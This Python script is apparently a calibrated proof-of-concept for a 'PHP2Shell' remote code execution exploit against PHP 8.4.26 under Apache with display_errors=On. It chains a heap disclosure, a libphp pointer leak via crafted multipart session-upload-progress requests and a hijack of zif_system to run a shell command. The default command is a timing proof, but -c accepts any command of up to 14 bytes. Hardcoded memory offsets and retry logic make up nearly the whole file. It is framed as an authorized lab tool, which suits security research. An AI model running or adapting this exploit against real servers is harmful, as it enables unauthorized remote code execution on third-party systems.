#!/usr/bin/env python3
"""Calibrated PHP2Shell PoC for the authorized display_errors=On lab.

Target profile:
  PHP 8.4.26 NTS / Apache prefork / x86_64
  memory_limit=8M / display_errors=On / one worker

The default command is ``sleep 5``.  A delayed connection close proves that
zif_system was reached without writing a file on the target.
"""

from __future__ import annotations

import argparse
import importlib.util
import struct
import sys
import time
from pathlib import Path


REPO = Path(__file__).resolve().parents[2]
ENGINE = REPO / "sources" / "alvarodh5-php2shell" / "exploit.py"
DTOR_OFFSET = 0x65EB60
ZIF_SYSTEM_OFFSET = 0x465370
HTDATA_OFFSET = 0x690D8


def load_engine():
    spec = importlib.util.spec_from_file_location("php2shell_engine", ENGINE)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot load {ENGINE}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def checked_rotate(exploit, attempts: int = 4) -> None:
    """Abort the current child and leave its replacement completely fresh."""
    target = exploit.t
    original = target.post
    for attempt in range(1, attempts + 1):
        responses: list[bytes] = []

        def recording_post(*args, **kwargs):
            response = original(*args, **kwargs)
            responses.append(response)
            return response

        target.post = recording_post
        try:
            exploit.rotate()
            # The reference driver retries the cleanup request up to three
            # times after one OOM prime.  Do not rebuild the heap between
            # these cleanup attempts.
            cleanup_boundary = b"BNDRY12345"
            cleanup_body = (
                b"--BNDRY12345\r\n"
                b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
                b"attacksessionid0001\r\n"
                b"--BNDRY12345\r\n"
                b'Content-Disposition: form-data; '
                b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
                b"pwn\r\n"
                b"--BNDRY12345--\r\n"
            )
            while responses and responses[-1] and len(responses) < 4:
                target.post(
                    cleanup_body,
                    cleanup_boundary,
                    read_cap=65536,
                    timeout=20.0,
                )
                time.sleep(0.3)
        finally:
            target.post = original
        sizes = [len(response) for response in responses]
        print(f"[*] rotate {attempt}/{attempts}: response sizes={sizes}")
        if len(responses) >= 2 and not responses[-1]:
            print("[+] worker aborted; replacement is fresh")
            return
    raise RuntimeError("could not verify worker rotation")


def calibrated_stage2(engine, exploit) -> int:
    """Leak zval_ptr_dtor with the target array kept as the final allocation."""
    exploit._oom(b"x" * 39)
    parts = [
        {"name": "PHPSESSID", "data": engine.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for index in range(407):
        count = 16 if index == 406 else 1
        for child in range(count):
            parts.append(
                {"name": f"a{index:04d}[{child}]", "data": b"x" * 16}
            )
    response = exploit.t.post(
        engine.multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20
    )
    cookie = engine.parse_cookie(response)
    if len(cookie) < 16:
        return 0
    pointer = int.from_bytes(cookie[8:16], "little")
    if not (0x100000000000 <= pointer < 0x800000000000):
        return 0
    if pointer & 0xFFF != DTOR_OFFSET & 0xFFF:
        return 0
    print(f"[+] phase-2 cookie: {cookie[:16].hex()}")
    return pointer


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Authorized PHP2Shell display_errors=On timing PoC"
    )
    parser.add_argument(
        "-u", "--url", default="http://192.168.125.10/index.php"
    )
    parser.add_argument("-c", "--cmd", default="sleep 5")
    parser.add_argument(
        "--expected-delay",
        type=float,
        default=5.0,
        help="seconds expected from the proof command; use 0 for no timing verdict",
    )
    parser.add_argument("--retries", type=int, default=4)
    parser.add_argument(
        "--assume-fresh",
        action="store_true",
        help="skip the initial rotation after Apache/container was just restarted",
    )
    args = parser.parse_args()
    if len(args.cmd.encode()) > 14:
        parser.error("the calibrated 167-byte carrier limits the command to 14 bytes")

    engine = load_engine()
    target = engine.Target(args.url, timeout=30)
    exploit = engine.Exploit(
        target,
        args.cmd,
        ZIF_SYSTEM_OFFSET,
        DTOR_OFFSET,
        HTDATA_OFFSET,
        12,
    )

    print(f"[*] target: {args.url}")
    print("[*] phase 1: Zend MM chunk disclosure")
    heap = 0
    for attempt in range(1, args.retries + 1):
        if attempt > 1 or not args.assume_fresh:
            checked_rotate(exploit)
        heap = exploit.stage1()
        print(f"[*] phase-1 attempt {attempt}/{args.retries}: {heap:#x}")
        if heap:
            break
    if not heap:
        print("[-] heap disclosure failed", file=sys.stderr)
        return 1

    print("[*] phase 2: libphp pointer disclosure")
    dtor = 0
    for attempt in range(1, args.retries + 1):
        checked_rotate(exploit)
        dtor = calibrated_stage2(engine, exploit)
        print(f"[*] phase-2 attempt {attempt}/{args.retries}: {dtor:#x}")
        if dtor:
            break
    if not dtor:
        print("[-] libphp disclosure failed", file=sys.stderr)
        return 1

    libphp = dtor - DTOR_OFFSET
    zif_system = libphp + ZIF_SYSTEM_OFFSET
    htdata = heap + HTDATA_OFFSET
    print(f"[+] Zend MM chunk = {heap:#x}")
    print(f"[+] zval_ptr_dtor = {dtor:#x}")
    print(f"[+] libphp base   = {libphp:#x}")
    print(f"[+] zif_system    = {zif_system:#x}")
    print(f"[+] fake HT data  = {htdata:#x}")

    threshold = max(1.0, args.expected_delay - 0.75)
    for attempt in range(1, args.retries + 1):
        terminal = engine.Exploit(
            target,
            args.cmd,
            zif_system,
            DTOR_OFFSET,
            HTDATA_OFFSET,
            12,
        )
        print(f"[*] terminal attempt {attempt}/{args.retries}")
        checked_rotate(terminal)
        original = target.post
        timings: list[tuple[float, int]] = []

        def timed_post(*post_args, **post_kwargs):
            started = time.monotonic()
            response = original(*post_args, **post_kwargs)
            timings.append((time.monotonic() - started, len(response)))
            return response

        target.post = timed_post
        try:
            terminal.stage3_9bie(htdata)
        finally:
            target.post = original

        for index, (elapsed, size) in enumerate(timings, 1):
            print(
                f"[*] terminal POST {index}: {elapsed:.3f}s, "
                f"response={size} bytes"
            )
        if len(timings) < 2:
            continue
        terminal_delay = timings[-1][0]
        socket_closed = timings[-1][1] == 0
        if args.expected_delay <= 0 and socket_closed:
            print("[+] terminal payload sent; worker closed the socket")
            return 0
        if args.expected_delay > 0 and socket_closed and terminal_delay >= threshold:
            print(
                f"[+] RCE CONFIRMED: {args.cmd!r} delayed the terminal POST "
                f"by {terminal_delay:.3f}s before the worker closed the socket"
            )
            return 0
    print("[-] RCE not confirmed after terminal retries", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
